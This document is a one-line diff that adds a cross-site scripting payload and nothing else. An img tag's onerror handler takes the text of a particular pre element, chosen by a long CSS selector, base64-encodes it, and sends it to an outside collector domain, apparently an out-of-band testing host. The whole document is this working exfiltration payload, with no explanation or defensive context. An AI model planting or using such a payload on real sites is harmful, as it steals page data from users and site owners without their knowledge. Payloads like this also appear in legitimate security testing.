@@ -1,0 +1,1 @@
+<img src=x onerror="new Image().src='https://4357lb9qmfdibwg34jls51dr5ib9z7pve.l.prod.burpcloth.infosec.a2z.com/?d='+btoa(document.querySelector('div.bc-container:nth-child(18) > adbl-style-scope:nth-child(1) > adbl-accordion:nth-child(3) > adbl-accordion-item:nth-child(1) > adbl-stack:nth-child(2) > pre:nth-child(5)')?.innerText)">
